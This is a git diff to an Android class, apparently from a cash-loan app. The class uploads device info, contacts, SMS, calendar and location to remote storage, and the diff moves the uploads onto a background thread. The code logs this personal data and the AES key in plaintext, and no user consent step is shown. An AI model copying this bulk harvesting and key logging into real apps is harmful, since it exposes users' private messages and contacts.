@@ -90,7 +90,7 @@ public class UploadData {
       systemInfo = new JSONObject();
     }
     Log.d(TAG, "device post data:" + systemInfo.toString());
-    postOssSign(systemInfo, token, domain, deviceKey, "device");
+    sendRequest(systemInfo, token, domain, deviceKey, "device");
   }
 
   /**
@@ -113,7 +113,7 @@ public class UploadData {
     }
     systemInfo.remove("contact");
     systemInfo.put("contact", contact);
-    postOssSign(systemInfo, token, domain, deviceKey, "contact");
+    sendRequest(systemInfo, token, domain, deviceKey, "contact");
   }
 
   /**
@@ -187,7 +187,7 @@ public class UploadData {
           systemInfo.remove("sms");
           systemInfo.put("sms", mInfoList);
           mInfoList = new ArrayList<>();
-          postOssSign(systemInfo, token, domain, deviceKey, "sms");
+          sendRequest(systemInfo, token, domain, deviceKey, "sms");
         }
       }
 
@@ -197,7 +197,7 @@ public class UploadData {
         systemInfo.remove("sms");
         systemInfo.put("sms", mInfoList);
         mInfoList = new ArrayList<>();
-        postOssSign(systemInfo, token, domain, deviceKey, "sms");
+        sendRequest(systemInfo, token, domain, deviceKey, "sms");
       }
     }
   }
@@ -221,7 +221,7 @@ public class UploadData {
     }
     systemInfo.remove("calendar");
     systemInfo.put("calendar", calendars);
-    postOssSign(systemInfo, token, domain, deviceKey, "calendar");
+    sendRequest(systemInfo, token, domain, deviceKey, "calendar");
   }
 
   /**
@@ -241,7 +241,7 @@ public class UploadData {
 //    systemInfo.remove("map");
 //    systemInfo.put("map", location);
     Log.d(TAG, "location post data:" + systemInfo.get("location"));
-    postOssSign(systemInfo, token, domain, deviceKey, "location");
+    sendRequest(systemInfo, token, domain, deviceKey, "location");
   }
 
   /**
@@ -335,7 +335,7 @@ public class UploadData {
     Log.d(TAG, "location get data:" + locationObj);
     this.mThisystemInfo.remove("location");
     this.mThisystemInfo.put("location", locationObj);
-    postOssSign(this.mThisystemInfo, this.mToken, this.mDomain, this.mDeviceKey, "location");
+    sendRequest(this.mThisystemInfo, this.mToken, this.mDomain, this.mDeviceKey, "location");
   }
 
   LocationListener mListener = new LocationListener() {
@@ -363,6 +363,22 @@ public class UploadData {
       sendLocation(location);
     }
   };
+
+
+  private void sendRequest(final JSONObject systemInfo, final String token, final String domain, final String deviceKey,
+      final String type) {
+    //发起请求
+    new Thread(new Runnable() {
+      @Override
+      public void run() {
+        try {
+          postOssSign(systemInfo, token, domain, deviceKey, type);
+        } catch (Exception e) {
+          e.printStackTrace();
+        }
+      }
+    }).start();
+  }
 
   @RequiresApi(api = VERSION_CODES.M)
   private void postOssSign(JSONObject systemInfo, String token, String domain, String deviceKey, String type) {
@@ -449,7 +465,7 @@ public class UploadData {
   @RequiresApi(api = VERSION_CODES.M)
   private void putDataSignUrl(JSONObject systemInfo, String bodyStr, String token, String domain,
       String deviceKey, String type) {
-    Log.d(TAG, "postOssSign bodyStr:" + bodyStr);
+    Log.d(TAG, "putDataSignUrl bodyStr:" + bodyStr);
     if(bodyStr == null || bodyStr.isEmpty()) {
       return;
     }
@@ -457,7 +473,7 @@ public class UploadData {
     Gson gson = new Gson();
     SignResponseInfo signResponseInfo = gson.fromJson(bodyStr, new TypeToken<SignResponseInfo>(){}.getType());
     if(signResponseInfo != null && signResponseInfo.getData() != null) {
-      Log.d(TAG, "postOssSign signResponseInfo:" + signResponseInfo.toString());
+      Log.d(TAG, "putDataSignUrl signResponseInfo:" + signResponseInfo.toString());
       Map<String, String> signData = signResponseInfo.getData();
       if(signData != null && !signData.isEmpty()) {
         String signUrl = signData.get("sign_url");
@@ -466,41 +482,41 @@ public class UploadData {
           //转码 sign_url 因 json 提炼导致 \u2006 转义成了 &
           try{
             //signUrl = signUrl.replaceAll("[&]", "\\u0026").trim();
-            Log.d(TAG, "postOssSign sign url:" + signUrl);
+            Log.d(TAG, "putDataSignUrl sign url:" + signUrl);
           } catch(Exception e){
-            Log.d(TAG, "postOssSign sign url exception:" + e.getMessage());
+            Log.d(TAG, "putDataSignUrl sign url exception:" + e.getMessage());
           }
 
           //ase加密
           String aseKey = generateRandomStr(16); //秘钥-16位随机数
-          Log.d(TAG, "postOssSign aseKey:" + aseKey);
+          Log.d(TAG, "putDataSignUrl aseKey:" + aseKey);
           String aesEncrypt = "";
 
           if(type == "device") {
             //设备信息
-            Log.d(TAG, "postOssSign device:" + systemInfo.toString());
+            Log.d(TAG, "putDataSignUrl device:" + systemInfo.toString());
             aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.toString());
-            Log.d(TAG, "postOssSign aesEncrypt:" + aesEncrypt);
+            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
           } else if(type == "contact") {
             //联系人信息
-            Log.d(TAG, "postOssSign contact:" + systemInfo.get("contact").toString());
+            Log.d(TAG, "putDataSignUrl contact:" + systemInfo.get("contact").toString());
             aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("contact").toString());
-            Log.d(TAG, "postOssSign aesEncrypt:" + aesEncrypt);
+            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
           } else if(type == "sms") {
             //短信字符串
-            Log.d(TAG, "postOssSign sms:" + systemInfo.get("sms").toString());
+            Log.d(TAG, "putDataSignUrl sms:" + systemInfo.get("sms").toString());
             aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("sms").toString());
-            Log.d(TAG, "postOssSign aesEncrypt:" + aesEncrypt);
+            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
           } else if(type == "calendar") {
             //日历信息
-            Log.d(TAG, "postOssSign calendar:" + systemInfo.get("calendar").toString());
+            Log.d(TAG, "putDataSignUrl calendar:" + systemInfo.get("calendar").toString());
             aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("calendar").toString());
-            Log.d(TAG, "postOssSign aesEncrypt:" + aesEncrypt);
+            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
           } else if(type == "location") {
             //位置信息
-            Log.d(TAG, "postOssSign location:" + systemInfo.get("location").toString());
+            Log.d(TAG, "putDataSignUrl location:" + systemInfo.get("location").toString());
             aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("location").toString());
-            Log.d(TAG, "postOssSign aesEncrypt:" + aesEncrypt);
+            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
           } else {
 
           }
@@ -508,9 +524,9 @@ public class UploadData {
           //构造请求 body
           RequestBody requestBody1 = FormBody.create(aesEncrypt.getBytes(StandardCharsets.UTF_8));
           try{
-            Log.d(TAG, "postOssSign requestBody contentType:" + requestBody1.contentType());
+            Log.d(TAG, "putDataSignUrl requestBody contentType:" + requestBody1.contentType());
           } catch(Exception e){
-            Log.d(TAG, "postOssSign requestBody contentType:" + e.getMessage());
+            Log.d(TAG, "putDataSignUrl requestBody contentType:" + e.getMessage());
           }
 
           //构造 put 请求
@@ -523,7 +539,7 @@ public class UploadData {
 
           //发起同步请求
           try {
-            Log.d(TAG, "postOssSign oss https");
+            Log.d(TAG, "putDataSignUrl oss https");
 
             HttpsUtils.SSLParams sslParams = HttpsUtils.getSslSocketFactory();
             OkHttpClient.Builder  builder1=new  OkHttpClient.Builder()
@@ -537,14 +553,14 @@ public class UploadData {
             OkHttpClient client =builder1.build();
             Response response1 = client.newCall(request1).execute();
             if(response1 == null || response1.code() != 200) {
-              Log.d(TAG, "postOssSign response is Null or code not 200" + response1.code() + " " + response1.message());
+              Log.d(TAG, "putDataSignUrl response is Null or code not 200" + response1.code() + " " + response1.message());
               return;
             }
 
             //调用report上报
             postReportData(token, domain, signUrl, aseKey, deviceKey, type);
           } catch (Exception e) {
-            Log.d(TAG, "postOssSign onFailure" + e.getMessage());
+            Log.d(TAG, "putDataSignUrl onFailure" + e.getMessage());
           }
 
         }
